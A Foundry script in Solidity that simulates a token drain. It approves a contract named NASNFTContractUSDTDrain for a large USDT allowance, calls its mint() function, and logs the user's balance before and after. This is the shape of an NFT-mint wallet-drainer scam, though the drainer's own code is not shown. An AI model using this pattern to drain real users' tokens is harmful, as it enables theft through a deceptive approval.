// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/YAUSDT.sol";
import "../src/NASNFTContractUSDTDrain.sol";

contract SimulateScript is Script {
    function run() public {
        vm.startBroadcast();

        // Initialise contracts
        YAUSDT yausdt = YAUSDT(address(0xdBB0d62e8aBa9c0d9aA1F5d2aB295Be9E96c2006));
        NASNFTContractUSDTDrain nasnft = NASNFTContractUSDTDrain(address(0x2b681DCAF5B298751d9c37AD454707593F0A635B));

        // yausdt.transfer(address(0xF69DDf6379a345089bB05ef6713FE15EFaf4E871), 1000000000000000000000);

        // Approval
        console.log("user usdt balance before", yausdt.balanceOf(address(0x9C64E2B8b1e1aE370f833F37B3690fcf1a2B6859)));
        yausdt.approve(address(0x2b681DCAF5B298751d9c37AD454707593F0A635B), 1000000000000000000000000); // 100k

        // Drain
        nasnft.mint();
        console.log("user usdt balance after:", yausdt.balanceOf(address(0x9C64E2B8b1e1aE370f833F37B3690fcf1a2B6859)));

        vm.stopBroadcast();
    }
}
